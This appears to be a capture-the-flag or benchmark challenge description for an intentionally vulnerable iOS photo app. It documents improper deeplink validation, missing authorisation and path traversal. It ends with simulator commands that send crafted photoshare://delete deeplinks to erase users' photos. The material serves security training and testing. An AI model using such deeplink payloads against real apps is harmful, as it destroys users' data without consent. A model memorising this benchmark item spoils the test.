# oxo-ios-ben5: iOS Improper Deeplink Validation

## Challenge Details

### Description
PhotoShare is a comprehensive photo management and sharing application for iOS that allows users to organize, share, and manage their personal photo collections. The app features intuitive photo browsing, album creation, sharing capabilities, and social features for connecting with friends and family.

The application includes:
- Photo gallery with smart organization and tagging
- Private and public album management
- Advanced sharing features with contact integration
- User profile management with activity tracking
- Cloud synchronization and backup capabilities
- Custom deeplink support for quick actions

### Vulnerability Type and Category
- **Type:** Improper Deeplink Validation / Insufficient Input Validation
- **Category:** Platform Security (OWASP Mobile M1 - Improper Platform Usage) / Improper Input Validation (CWE-20)

### Weakness (CWE)
- **CWE-20:** Improper Input Validation
- **CWE-200:** Information Exposure
- **CWE-22:** Path Traversal (in export functionality)

### Platform
iOS (Swift/SwiftUI)

### Difficulty
Medium

## Vulnerability Overview
The PhotoShare application registers a custom URL scheme `photoshare://` and implements deeplink handlers that process various photo management actions. However, the application fails to properly validate deeplink parameters, authenticate the source of deeplinks, or verify user authorization before executing sensitive operations.

**Key Vulnerability Points:**
- No parameter sanitization for photo IDs and file paths
- Missing authentication checks for sensitive deeplink actions
- Automatic execution of share, delete, and export operations
- Path traversal vulnerability in export functionality
- No validation of recipient email addresses in sharing

## Exploitation Example (Deletion)

```bash
# Delete photos using image names (confirmed working)
xcrun simctl openurl booted "photoshare://delete?photo_id=mountain_view"
xcrun simctl openurl booted "photoshare://delete?photo_id=beach_sunset"
xcrun simctl openurl booted "photoshare://delete?photo_id=wedding_photo"
xcrun simctl openurl booted "photoshare://delete?photo_id=family_dinner"

# Delete using photo titles (URL encoded)
xcrun simctl openurl booted "photoshare://delete?photo_id=Beach%20Sunset"
xcrun simctl openurl booted "photoshare://delete?photo_id=Wedding%20Photo"
```